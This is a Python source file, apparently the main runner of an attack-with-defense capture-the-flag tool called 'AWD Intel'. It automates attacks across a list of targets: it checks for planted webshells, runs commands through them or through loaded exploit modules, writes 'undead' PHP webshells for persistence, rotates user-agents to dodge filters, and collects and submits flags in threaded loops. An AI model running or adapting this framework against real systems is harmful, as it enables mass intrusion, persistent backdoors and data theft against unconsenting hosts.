#!/usr/bin/env python

import traceback
import importlib
from framework.http import http
from framework.config import *
from framework.flag import *
from framework.function import *
import framework.function as function
import os
import sys
import time
from optparse import OptionParser
import threading
import Queue
import framework.config as config


class awd_intel():

	def __init__(self,options,get_flag,script_runtime_span):

		self.targets = self.prepare_tgt(options.udf_target)

		# init the queue
		self.queue=Queue.Queue(1000)
		for target in self.targets:
			self.queue.put(target)

		# init the loop count
		dump_info("loop count set to %d "%int(options.loop_count))
		self.loop_count = int(options.loop_count) - 1

		# cmd to execute
		self.cmd = options.command

		# random_ua
		self.random_ua = options.random_ua
		if self.random_ua:
			dump_info("enable feature random user-agent")

		# wheather to get the flag
		self.get_flag = self.prepare_flag(get_flag,options.command)
		if self.get_flag:
			dump_info("begin to run for flag")

		# script_runtime_span
		self.script_runtime_span = script_runtime_span
		dump_info("loop count set to %d "%int(script_runtime_span))

		# stop flag
		self.stop = 0

		# the status for a target
		self.now_status = ''

		# the status for all targets
		self.targets_status = ''

		# load the attack module and function
		load_script = options.module
		self.vulnerable_attack = importlib.import_module('samples.' + load_script).vulnerable_attack
		dump_info("load module: %s"%('samples.' + load_script + '.vulnerable_attack'))





	def prepare_tgt(self,udf_target):
		'''
			prepare the targets
		'''
		targets = []
		if udf_target:
			return udf_target.split(',')
		else:
			for target in open(target_list).readlines():
				target = target.strip('\n')
				targets.append(target)
			return targets



	def prepare_cmd(self,cmd,target,target_port):
		'''
			wrap the cmd  
		'''
		cmd_split_prefix = "/bin/echo %s;"%cmd_prefix
		cmd_split_postfix = "/bin/echo %s;"%cmd_postfix

		func = getattr(function,cmd)
		if func:
			cmd = cmd_split_prefix + func(target,target_port,"") + cmd_split_postfix
		else:
			cmd = cmd_split_prefix + cmd + cmd_split_postfix

		return cmd


	def prepare_flag(self,get_flag,cmd):
		'''
			determine whether to get flag
			get_flag = 2  ;  force to get flag
			get_flag = 1  ;  auto determined
			get_flag = 0  ; force not to get flag
		'''
		if get_flag == 2 :
			return 1
		elif get_flag == 0:
			return 0
		else:
			if 'get_flag' in cmd:
				return 1
			else:
				return 0 



	def attack(self,target,target_port,cmd,get_flag):

		# status
		global headers,targets_status
		is_vuln = 1
		is_shell = True
		is_alive = 1
		is_flag = 0
		flag = "hello world!"
		info = "success"
		reserve = 0    

		# using random ua for confusing
		if self.random_ua:
			headers['User-Agent'] = random_ua()

		# check shell
		is_shell = check_shell(target,target_port,"")
		if is_shell=='timeout':
			shell_name,shell_arg = shell_hash(target,target_port)
			# Sometime the timeout is result from we are generating an undead webshell
			if shell_name in cmd and shell_type==2 and check_shell(target,target_port,"")!='hell0W0r1d':
				dump_warning("Writting undead php webshell")
				res = "don't panic: timeout due to write undead webshell"
			else:
				dump_error("connect timeout",target+":"+str(target_port),"function.py check_shell")
				write_specific_log(target,target_port,"[-] connect timeout")
				is_alive = 0
				res = "timeout"
		elif is_shell:
			dump_success("check_shell success",target+":"+str(target_port),"function.py check_shell")
			write_specific_log(target,target_port,"[+] check shell success")
			res = execute_shell(target,target_port,cmd)
		else:
			dump_warning("check_shell failed",target+":"+str(target_port),"function.py check_shell")
			write_specific_log(target,target_port,"[-] check shell fail")
			# Here we use the vulnerability we found in the source code
			res = self.vulnerable_attack(target,target_port,cmd)

		# filter the res
		debug_print(res)
		res = res_filter(res)

		# flag handle
		if get_flag:
			if check_flag(res):
				flag = res
				is_flag = 1
				dump_info("flag => " + res.replace(" ","").replace("\n",""))
			else:
				#is_vuln = 0
				dump_warning("flag format error,you may need to rewrite the shell", target+":"+str(target_port) ,"run.py attack")
				write_specific_log(target,target_port,"[-] flag format wrong")
		if "error happen" in res:
			dump_warning("execution cmd failed",target+":"+str(target_port),"run.py")
			is_vuln = 0
			is_flag = 0
			write_specific_log(target,target_port,"[-] execute cmd fail")
		else:
			dump_success("execution cmd",target+":"+str(target_port),"run.py")
			write_specific_log(target,target_port,"[+] execute cmd success")
		dump_context(res)
		

		# display the status for a target
		self.now_status =  (target + ":" + target_port).ljust(32," ")
		if is_alive:
			self.now_status += "|alive|"
			if is_vuln:
				self.now_status += "|vuln|"
			if is_shell:
				self.now_status += "|shell|"
			if is_flag:
				self.now_status += "|flag|"
		else:
			self.now_status += '|timeout|'
		self.now_status += "\n"
		dump_context("")
		dump_success(self.now_status)
		dump_context("")
		self.targets_status += self.now_status
		self.now_status = ''


		return flag,is_vuln,info,reserve 


	def watch_dog(self):
		'''
			check the status of the thread
		'''
		while True:
			time.sleep(30)
			dump_warning('######  thread status ######')
			for my_thread in self.thread_array:
				dump_warning(my_thread.name + ' => ' + 'Alive' if my_thread.isAlive() else 'Dead')
			dump_warning('######  status ends  ######')
			time.sleep(30)


	def attack_thread(self):
		'''
			the attacking thread to be called
		'''
		dump_info("An attacking thread has been envoked!")
		while True:
			if self.queue.empty():
				# if the queue is empty with the stop flag, stop the thread
				if self.stop:
					dump_warning("An attacking thread has been stopped!")
					return
			else:
				# queue is not empty
				target = self.queue.get()

				if target:
					target,target_port = target.split(':')

					# prepare the cmd for specific target
					cmd = self.prepare_cmd(self.cmd,target,target_port)
					dump_info("start attack %s with %s "%(target + ':' + target_port, self.cmd))

					self.attack(target,target_port,cmd,self.get_flag)
				else:
					# sleep to reduce the condition race
					dump_warning('condition race detected')
					time.sleep(1)







	def queue_thread(self):
		'''
			maintain with the queue
		'''

		while True:
			if self.queue.empty():
				if self.loop_count > 0:

					# sleep serveral seconds
					time.sleep(script_runtime_span)
					# sometimes the status may not appear to be intact, because some tasks are undergonging
					# you may add up the script_runtime_span to avoid that
					dump_info("---------------------------- one round finish -----------------------------")
					dump_success(self.now_status)
					dump_context("")
					dump_context("")
					dump_context("")


					self.loop_count -= 1
					for target in self.targets:
						self.queue.put(target)

				else:
					# to exit the whole program, set the stop flag to 1
					self.stop = 1




# def run():
# 	global raw_cmd,cmd,first_run
# 	cmd_split_prefix = "/bin/echo %s;"%cmd_prefix
# 	cmd_split_postfix = ";/bin/echo %s"%cmd_postfix
	
# 	# if the target list exsists, load it. or regard it as ip addr
# 	if udf_target:
# 		targets = udf_target.split(',')
# 	elif os.path.isfile(target_list):
# 		targets = open(target_list).readlines()

# 	for target in targets:
# 		target = target.strip('\n')
# 		target,target_port = target.split(":")
# 		reserve = 0
# 		is_vuln = 1
# 		info = "error"
# 		flag = "hello world!"

# 		try:
# 			# Save the raw cmd
# 			if first_run:
# 				raw_cmd = cmd
# 				first_run = 0
# 			dump_success("start attack %s with %s "%(target+":"+target_port,raw_cmd))
# 			# Use the func in function.py to translate the cmd to real cmd
# 			if func:
# 				cmd = cmd_split_prefix + func(target,target_port,"") + cmd_split_postfix
# 			else:
# 				cmd = cmd_split_prefix + raw_cmd + cmd_split_postfix
# 			debug_print(cmd)
# 			flag,is_vuln,info,reserve = attack(target,target_port,cmd,run_for_flag)
			
# 			# Try to visit the undead shell after it generates
# 			if shell_type == 2 and raw_cmd == 'get_shell':
# 				dump_info("Visting the undead shell...")
# 				visit_shell(target,target_port,'')

# 		except Exception,e:
# 			debug_print(traceback.format_exc())
# 			dump_error(str(e),target,"run.py")
		
# 		#set the return value reverse => 0 and is_vuln => 1 and the flag has  been changed, post the flag.
# 		if not reserve and  is_vuln and flag!="hello world!":
# 			res = post_flag(flag,target)
# 			if res:
# 				dump_success("get flag success",target+":"+str(target_port),"run.py")
# 				write_specific_log(target,target_port,"[+] get flag success")
# 			else:
# 				# flag server check error may result from the duplicate submission of the flag 
# 				dump_warning("flag server check error",target+":"+str(target_port),"run.py")
# 				write_specific_log(target,target_port,"[-] flag server check error")
# 		elif is_vuln == 0:
# 			dump_error("server is not vulnerable",target+":"+str(target_port),"run.py")
# 			write_specific_log(target,target_port,"[-] server is not vulnerable to current payload")
# 		elif reserve==1:
# 			dump_error("reverse flag has been set",target+":"+str(target_port),"run.py")
# 			write_specific_log(target,target_port,"[-] reverse flag has been set")
# 		dump_success("finish attack %s with %s"%(target+":"+target_port,raw_cmd))
# 		print ""
# 		print ""
# 		print ""
				 
def banner():
	my_banner = ""
	my_banner += "    ___        ______    ___       _       _ \n"
	my_banner += "   / \ \      / /  _ \  |_ _|_ __ | |_ ___| |\n"
	my_banner += "  / _ \ \ /\ / /| | | |  | || '_ \| __/ _ \ |\n"
	my_banner += " / ___ \ V  V / | |_| |  | || | | | ||  __/ |\n"
	my_banner += "/_/   \_\_/\_/  |____/  |___|_| |_|\__\___|_|\n"
	my_banner += "                                             \n"
	my_banner += "                          Hence Zhang@Lancet \n"
	my_banner += "                                             \n"
	print my_banner

def parse_options():

	parser = OptionParser()
	parser.add_option("-m", "--module",\
					 dest="module", default="sample",\
					  help="Input the attack module here :)")
	
	parser.add_option("-c", "--command",\
					 dest="command", default="get_flag",\
					  help="The command you want to run")
	
	parser.add_option("-r", "--random_ua",\
					 dest="random_ua", default="False",\
					  help="Enable the random UA to avoid filter")
	parser.add_option("-l", "--loop",\
					 dest="loop_count", default="65535",\
					  help="To set the loop count for this program")
	parser.add_option("-t", "--udf_target",\
					 dest="udf_target", default="",\
					  help="To set the target for attacking, split with ,")
	parser.add_option("-x", "--thread",\
					 dest="thread", default="1",\
					  help="To set thread number for attacking")
	(options, args) = parser.parse_args()

	return options



if __name__ == '__main__':
	
	# print banner
	banner()

	# parse options
	options = parse_options()


	# dump_info("Start the AWD Intel to hack the planet :)")
	# load_script = options.module
	# cmd = options.command
	# loop_count = int(options.loop_count)
	# udf_target = options.udf_target
	# if options.random_ua:
	# 	dump_info("enable feature random user-agent")
	# if cmd=="get_flag" or cmd=="get_flag_2":
	# 	run_for_flag = 1


	awd = awd_intel(options=options,get_flag=1,script_runtime_span=script_runtime_span)


	thread_array = []

	t0 = threading.Thread(target=awd.queue_thread,name='queue_thread')
	thread_array.append(t0)

	for i in range(int(options.thread)):
		t = threading.Thread(target=awd.attack_thread,name='attack_thread_%d'%(i+1))	
		thread_array.append(t)

	for t in thread_array:
		t.setDaemon(True)
		t.start()

	try:
		while True:
			pass
	except KeyboardInterrupt:
		dump_error("Program stoped by user, existing...")
		sys.exit()

	dump_info("finish all tasks, have a nice day :)")



	# vulnerable_attack = importlib.import_module('samples.' + load_script).vulnerable_attack
	# if hasattr(function,cmd):
	# 	func = getattr(function,cmd)
	# else:
	# 	func = None

	# while loop_count > 0:
	# 	try:
	# 		run()
	# 		record_status(targets_status)
	# 		targets_status = ''
	# 		dump_info("sleeping ...")
	# 		time.sleep(script_runtime_span)
	# 	except  KeyboardInterrupt:
	# 		dump_error("Program stoped by user, existing...")
	# 		exit()
	# 	dump_info("---------------------------- one round finish -----------------------------")
	# 	print ""
	# 	loop_count -= 1
	# dump_info("finish all tasks, have a nice day :)")
